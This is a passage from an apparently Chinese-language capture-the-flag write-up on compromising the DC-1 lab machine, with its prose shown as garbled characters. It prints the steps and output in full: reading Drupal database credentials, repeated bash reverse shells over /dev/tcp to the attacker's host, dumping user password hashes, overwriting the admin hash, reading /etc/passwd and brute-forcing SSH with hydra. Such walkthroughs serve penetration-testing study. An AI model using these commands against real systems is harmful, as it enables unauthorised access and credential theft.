<p><code>å¹¶ä¸”ä¹Ÿçœ‹åˆ°äº†flag2ä¸æç¤ºä¿¡æ¯ï¼Œå†…å®¹ä¸ºï¼šæš´åŠ›ç ´è§£ä¸ç›®å½•æ”»å‡»ä¸æ˜¯ä½ è®¿é—®ç³»ç»Ÿçš„å”¯ä¸€é€”å¾„ï¼Œä½†æ˜¯ä½ å¯ä»¥å°è¯•ä¸€ä¸‹</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; cat settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren<span class="string">&#x27;t the</span></span><br><span class="line"><span class="string"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="string"> * What can you do with these credentials?</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$databases = array (</span></span><br><span class="line"><span class="string">  &#x27;</span>default<span class="string">&#x27; =&gt; </span></span><br><span class="line"><span class="string">  array (</span></span><br><span class="line"><span class="string">    &#x27;</span>default<span class="string">&#x27; =&gt; </span></span><br><span class="line"><span class="string">    array (</span></span><br><span class="line"><span class="string">      &#x27;</span>database<span class="string">&#x27; =&gt; &#x27;</span>drupaldb<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>username<span class="string">&#x27; =&gt; &#x27;</span>dbuser<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>password<span class="string">&#x27; =&gt; &#x27;</span>R0ck3t<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>host<span class="string">&#x27; =&gt; &#x27;</span>localhost<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>port<span class="string">&#x27; =&gt; &#x27;</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>driver<span class="string">&#x27; =&gt; &#x27;</span>mysql<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>prefix<span class="string">&#x27; =&gt; &#x27;</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    ),</span></span><br><span class="line"><span class="string">  ),</span></span><br><span class="line"><span class="string">);</span></span><br></pre></td></tr></table></figure>

<h2 id="0x06-ç™»å…¥æ•°æ®åº“"><a href="#0x06-ç™»å…¥æ•°æ®åº“" class="headerlink" title="0x06.ç™»å…¥æ•°æ®åº“"></a>0x06.ç™»å…¥æ•°æ®åº“</h2><p><code>ç”±äºmeterpreterä¸èƒ½è¿›è¡Œmysqlç™»å…¥ï¼Œæ‰€ä»¥è¿›å…¥åˆ°å¸¸è§„shellä¸‹ï¼Œå‘ç°3306æ˜¯å¼€æ”¾çš„ï¼Œå¹¶ä¸”åªå…è®¸æœ¬åœ°è¿æ¥</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3903 created.</span><br><span class="line">Channel 7 created.</span><br><span class="line">netstat -apntu</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:41087           0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 192.168.1.3:52082       192.168.1.6:4444        ESTABLISHED 3837/php        </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 ::1:25                  :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::111                  :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::36531                :::*                    LISTEN      -               </span><br><span class="line">tcp6       1      0 192.168.1.3:80          192.168.1.6:40931       CLOSE_WAIT  -               </span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:49260           0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:783             0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 127.0.0.1:815           0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:50997           0.0.0.0:*                           -               </span><br><span class="line">udp6       0      0 :::48070                :::*                                -               </span><br><span class="line">udp6       0      0 :::111                  :::*                                -   </span><br><span class="line">udp6       0      0 :::62200                :::*                                -               </span><br><span class="line">udp6       0      0 :::783                  :::*                                -         </span><br></pre></td></tr></table></figure>

<p><code>å°è¯•ç™»å…¥ï¼Œå‘ç°åœ¨å½“å‰shellä¸‹æ˜¯æ— æ³•ç™»å…¥çš„</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>ç”±äºè¿™ä¸ªshellæ˜¯httpæ–¹å¼å»ºç«‹çš„ï¼Œä¸æ˜¯æŒä¹…è¿æ¥ï¼Œæ‰€ä»¥ä¸‹é¢å»ºç«‹æŒä¹…è¿æ¥</code></p>
<h2 id="0x07-åå¼¹shell"><a href="#0x07-åå¼¹shell" class="headerlink" title="0x07.åå¼¹shell"></a>0x07.åå¼¹shell</h2><p><code>ç”±äºéœ€è¦å»ºç«‹æŒä¹…è¿æ¥ï¼Œæ‰€ä»¥å°è¯•å°†DC1çš„shellåå¼¹ç»™kali</code></p>
<h3 id="1-kaliå…ˆç›‘å¬6666ç«¯å£"><a href="#1-kaliå…ˆç›‘å¬6666ç«¯å£" class="headerlink" title="1.kaliå…ˆç›‘å¬6666ç«¯å£"></a>1.kaliå…ˆç›‘å¬6666ç«¯å£</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-DC1æ‰§è¡Œ"><a href="#2-DC1æ‰§è¡Œ" class="headerlink" title="2.DC1æ‰§è¡Œ"></a>2.DC1æ‰§è¡Œ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><code>å’¦ï¼ŒæŠ¥é”™äº†ğŸ˜±æ¢ä¸ªæ–¹æ³•</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3911 created.</span><br><span class="line">Channel 8 created.</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br><span class="line">/bin/sh: 2: Syntax error: Bad fd numbermeterpreter &gt; </span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><code>ä¹Ÿä¸è¡Œï¼Œæˆ‘giao</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3915 created.</span><br><span class="line">Channel 10 created.</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1                                                                                                      </span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>å†æ¢ä¸ªæ–¹æ³•ï¼Œæ­¤æ–¹æ³•ä¸ºä½¿ç”¨pythonè„šæœ¬å…ˆå»ºç«‹äº¤äº’shellå†åå¼¹shellç»™kali</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>è¿™å›æˆåŠŸäº†ï¼ŒæˆåŠŸå»ºç«‹äº¤äº’å¼shell</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3924 created.</span><br><span class="line">Channel 12 created.</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@DC-1:/var/www$ /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h3 id="3-åå¼¹"><a href="#3-åå¼¹" class="headerlink" title="3.åå¼¹"></a>3.åå¼¹</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.3] 51322</span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure>

<p><code>åå¼¹æˆåŠŸå†æ¬¡ç™»å…¥mysql</code></p>
<h2 id="0x08-å†æ¬¡ç™»å…¥mysql"><a href="#0x08-å†æ¬¡ç™»å…¥mysql" class="headerlink" title="0x08.å†æ¬¡ç™»å…¥mysql"></a>0x08.å†æ¬¡ç™»å…¥mysql</h2><p><code>ç„¶è€Œåœ¨åå¼¹ç»™kaliçš„shellä¸èƒ½ç™»é™†åˆ°mysqlï¼ˆæˆ‘giaoï¼Œè¿™æ˜¯ä»€ä¹ˆåŸç†ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼‰</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.3] 51322</span><br><span class="line">www-data@DC-1:/var/www$ mysql -udbuser -pR0ck3t</span><br><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>ä½†æ˜¯åœ¨ä½¿ç”¨pythonè„šæœ¬è·å¾—çš„äº¤äº’å¼shellä¸‹å´å¯ä»¥ç™»å…¥ï¼Œèœç‹—ä¸€è„¸é—®å·â“â“â“â“â“â“â“â“â“ï¼ˆæˆ‘ç«Ÿç„¶é¥¶äº†ä¸€åœˆã€‚ã€‚ã€‚ï¼‰</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3960 created.</span><br><span class="line">Channel 16 created.</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@DC-1:/var/www$ mysql -udbuser -pR0ck3t</span><br><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 16035</span><br><span class="line">Server version: 5.5.60-0+deb7u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-æŸ¥çœ‹æ•°æ®åº“"><a href="#1-æŸ¥çœ‹æ•°æ®åº“" class="headerlink" title="1.æŸ¥çœ‹æ•°æ®åº“"></a>1.æŸ¥çœ‹æ•°æ®åº“</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>

<h3 id="2-ä½¿ç”¨drupaldbï¼ŒæŸ¥çœ‹è¡¨"><a href="#2-ä½¿ç”¨drupaldbï¼ŒæŸ¥çœ‹è¡¨" class="headerlink" title="2.ä½¿ç”¨drupaldbï¼ŒæŸ¥çœ‹è¡¨"></a>2.ä½¿ç”¨drupaldbï¼ŒæŸ¥çœ‹è¡¨</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; use drupaldb     </span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;    </span><br><span class="line">show tables;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| Tables_in_drupaldb          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| actions                     |</span><br><span class="line">| authmap                     |</span><br><span class="line">| batch                       |</span><br><span class="line">| block                       |</span><br><span class="line">| block_custom                |</span><br><span class="line">| block_node_type             |</span><br><span class="line">| block_role                  |</span><br><span class="line">| blocked_ips                 |</span><br><span class="line">| cache                       |</span><br><span class="line">| cache_block                 |</span><br><span class="line">| cache_bootstrap             |</span><br><span class="line">| cache_field                 |</span><br><span class="line">| cache_filter                |</span><br><span class="line">| cache_form                  |</span><br><span class="line">| cache_image                 |</span><br><span class="line">| cache_menu                  |</span><br><span class="line">| cache_page                  |</span><br><span class="line">| cache_path                  |</span><br><span class="line">| cache_update                |</span><br><span class="line">| cache_views                 |</span><br><span class="line">| cache_views_data            |</span><br><span class="line">| comment                     |</span><br><span class="line">| ctools_css_cache            |</span><br><span class="line">| ctools_object_cache         |</span><br><span class="line">| date_format_locale          |</span><br><span class="line">| date_format_type            |</span><br><span class="line">| date_formats                |</span><br><span class="line">| field_config                |</span><br><span class="line">| field_config_instance       |</span><br><span class="line">| field_data_body             |</span><br><span class="line">| field_data_comment_body     |</span><br><span class="line">| field_data_field_image      |</span><br><span class="line">| field_data_field_tags       |</span><br><span class="line">| field_revision_body         |</span><br><span class="line">| field_revision_comment_body |</span><br><span class="line">| field_revision_field_image  |</span><br><span class="line">| field_revision_field_tags   |</span><br><span class="line">| file_managed                |</span><br><span class="line">| file_usage                  |</span><br><span class="line">| filter                      |</span><br><span class="line">| filter_format               |</span><br><span class="line">| flood                       |</span><br><span class="line">| <span class="built_in">history</span>                     |</span><br><span class="line">| image_effects               |</span><br><span class="line">| image_styles                |</span><br><span class="line">| menu_custom                 |</span><br><span class="line">| menu_links                  |</span><br><span class="line">| menu_router                 |</span><br><span class="line">| node                        |</span><br><span class="line">| node_access                 |</span><br><span class="line">| node_comment_statistics     |</span><br><span class="line">| node_revision               |</span><br><span class="line">| node_type                   |</span><br><span class="line">| queue                       |</span><br><span class="line">| rdf_mapping                 |</span><br><span class="line">| registry                    |</span><br><span class="line">| registry_file               |</span><br><span class="line">| role                        |</span><br><span class="line">| role_permission             |</span><br><span class="line">| search_dataset              |</span><br><span class="line">| search_index                |</span><br><span class="line">| search_node_links           |</span><br><span class="line">| search_total                |</span><br><span class="line">| semaphore                   |</span><br><span class="line">| sequences                   |</span><br><span class="line">| sessions                    |</span><br><span class="line">| shortcut_set                |</span><br><span class="line">| shortcut_set_users          |</span><br><span class="line">| system                      |</span><br><span class="line">| taxonomy_index              |</span><br><span class="line">| taxonomy_term_data          |</span><br><span class="line">| taxonomy_term_hierarchy     |</span><br><span class="line">| taxonomy_vocabulary         |</span><br><span class="line">| url_alias                   |</span><br><span class="line">| users                       |</span><br><span class="line">| users_roles                 |</span><br><span class="line">| variable                    |</span><br><span class="line">| views_display               |</span><br><span class="line">| views_view                  |</span><br><span class="line">| watchdog                    |</span><br><span class="line">+-----------------------------+</span><br><span class="line">80 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>

<p><code>80å¼ è¡¨å¤ªè¿‡åˆ†äº†ï¼å¯ä»¥çœ‹åˆ°usersè¡¨</code></p>
<h3 id="3-æŸ¥çœ‹usersè¡¨"><a href="#3-æŸ¥çœ‹usersè¡¨" class="headerlink" title="3.æŸ¥çœ‹usersè¡¨"></a>3.æŸ¥çœ‹usersè¡¨</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users\G  //\Gè¡¨ç¤ºå°†è¡¨æ—‹è½¬90Â°</span><br><span class="line">select * from users\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">             uid: 0</span><br><span class="line">            name: </span><br><span class="line">            pass: </span><br><span class="line">            mail: </span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: 0</span><br><span class="line">          access: 0</span><br><span class="line">           login: 0</span><br><span class="line">          status: 0</span><br><span class="line">        timezone: NULL</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: </span><br><span class="line">            data: NULL</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">             uid: 1</span><br><span class="line">            name: admin</span><br><span class="line">            pass: <span class="variable">$S</span><span class="variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR</span><br><span class="line">            mail: admin@example.com</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: NULL</span><br><span class="line">         created: 1550581826</span><br><span class="line">          access: 1550583852</span><br><span class="line">           login: 1550582362</span><br><span class="line">          status: 1</span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: admin@example.com</span><br><span class="line">            data: b:0;</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">             uid: 2</span><br><span class="line">            name: Fred</span><br><span class="line">            pass: <span class="variable">$S</span><span class="variable">$DWGrxef6</span>.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg</span><br><span class="line">            mail: fred@example.org</span><br><span class="line">           theme: </span><br><span class="line">       signature: </span><br><span class="line">signature_format: filtered_html</span><br><span class="line">         created: 1550581952</span><br><span class="line">          access: 1550582225</span><br><span class="line">           login: 1550582225</span><br><span class="line">          status: 1</span><br><span class="line">        timezone: Australia/Melbourne</span><br><span class="line">        language: </span><br><span class="line">         picture: 0</span><br><span class="line">            init: fred@example.org</span><br><span class="line">            data: b:0;</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>

<p><code>å¯ä»¥çœ‹åˆ°cmsçš„ç®¡ç†ç”¨æˆ·åŠ å¯†å¯†ç ï¼Œå‰é¢flag2æç¤ºäº†ï¼Œæš´åŠ›ç ´è§£ä¸æ˜¯å”¯ä¸€æ–¹æ³•ï¼Œé‚£ä¹ˆå°±æ¢ä¸€ä¸ªæ€è·¯</code></p>
<h3 id="4-ä¿®æ”¹è¦†ç›–adminå¯†ç "><a href="#4-ä¿®æ”¹è¦†ç›–adminå¯†ç " class="headerlink" title="4.ä¿®æ”¹è¦†ç›–adminå¯†ç "></a>4.ä¿®æ”¹è¦†ç›–adminå¯†ç </h3><p><code>ç”¨ä¸€ä¸ªæ–°çš„å¯†ç å¯†æ–‡å°†åŸæ¥çš„å¯†ç è¦†ç›–æ‰ï¼Œæ‰‹åŠ¨ç”Ÿæˆ</code></p>
<p><code>ä½¿ç”¨PHPè°ƒç”¨scripts/password-hash.shç”Ÿæˆadminçš„å¯†æ–‡</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ php scripts/password-hash.sh admin      </span><br><span class="line">php scripts/password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin                 <span class="built_in">hash</span>: <span class="variable">$S</span><span class="variable">$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F</span>.KYKPn.qzT7vbfsg27</span><br><span class="line"></span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure>

<p><code>è¦†ç›–</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update users set pass&#x3D;&quot;$S$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F.KYKPn.qzT7vbfsg27&quot; where uid&#x3D;1;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; use drupaldb;</span><br><span class="line">use drupaldb;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; update users set pass&#x3D;&quot;$S$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F.KYKPn.qzT7vbfsg27&quot; where uid&#x3D;1;</span><br><span class="line">&lt;s&#x3D;&quot;$S$D4KjoV1PUSBjXtqmjsUaVuRE4TrPc8iY2F.KYKPn.qzT7vbfsg27&quot; where uid&#x3D;1;    </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>

<h2 id="0x09-ç™»å…¥cms"><a href="#0x09-ç™»å…¥cms" class="headerlink" title="0x09.ç™»å…¥cms"></a>0x09.ç™»å…¥cms</h2><p><code>admin/adminç™»å…¥</code></p>
<img src="/2020/08/21/DC-1/image-20200820233740808.png" class>

<p><code>æˆåŠŸç™»å…¥</code></p>
<img src="/2020/08/21/DC-1/image-20200820234010015.png" class>

<p><code>ç‚¹å‡»ä»ªè¡¨ç›˜å‘ç°flag3</code></p>
<img src="/2020/08/21/DC-1/image-20200820234207549.png" class>

<p><code>ç‚¹å‡»flag3</code></p>
<img src="/2020/08/21/DC-1/image-20200820234432653.png" class>

<p><code>å‘ç°çº¿ç´¢åœ¨passwdä¸­ï¼ŒæŸ¥çœ‹passwd</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:104::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:103:107::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure>

<p><code>ç»“å°¾å‘ç°flag4ï¼Œå¹¶ä¸”ä¸º/bin/bashï¼Œæ˜¯å¯ä»¥ç™»å…¥çš„ï¼Œå‰æ–‡å·²ç»å‘ç°å¼€å¯äº†22ç«¯å£</code></p>
<p><code>æ¥ä¸‹æ¥è¿›è¡Œçˆ†ç ´</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment">#hydra -l flag4 -P /usr/share/john/password.lst 192.168.1.6 ssh -vV -f -o hydra.ssh</span></span><br><span class="line">......    //-lç”¨æˆ·åï¼Œ-På­—å…¸ï¼Œ-vVä¸ºçˆ†ç ´è¯¦ç»†ä¿¡æ¯ï¼Œ-fä¸ºå¦‚æœé‡åˆ°æ­£ç¡®çš„å¯†ç åˆ™åœæ­¢çˆ†ç ´ï¼Œ-oè¾“å‡ºæ–‡ä»¶</span><br><span class="line">......</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;delta&quot;</span> - 137 of 3562 [child 2] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;doctor&quot;</span> - 138 of 3562 [child 8] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;fisher&quot;</span> - 139 of 3562 [child 10] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;island&quot;</span> - 140 of 3562 [child 9] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;john&quot;</span> - 141 of 3562 [child 15] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;joshua&quot;</span> - 142 of 3562 [child 0] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;karen&quot;</span> - 143 of 3562 [child 7] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;marley&quot;</span> - 144 of 3562 [child 1] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.3 - login <span class="string">&quot;flag4&quot;</span> - pass <span class="string">&quot;orange&quot;</span> - 145 of 3562 [child 12] (0/3)</span><br><span class="line">[22][ssh] host: 192.168.1.3   login: flag4   password: orange</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.1.3 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-20 11:58:01</span><br><span class="line">root@JIYE:~/tmp/DC1<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><code>ç ´è§£å‡ºå¯†ç ä¸ºorange</code></p>
<p><code>ç™»å…¥</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># ssh flag4@192.168.1.3</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.1.3 (192.168.1.3)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:89B+YqcNl4cSf/BZk26MQG1QeW4BvBlVENMbTRhVhsU.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? y</span></span><br><span class="line"><span class="string">Please type &#x27;</span>yes<span class="string">&#x27;, &#x27;</span>no<span class="string">&#x27; or the fingerprint: yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.1.3<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">flag4@192.168.1.3&#x27;</span>s password: </span><br><span class="line">Linux DC-1 3.2.0-6-486 <span class="comment">#1 Debian 3.2.102-1 i686</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span 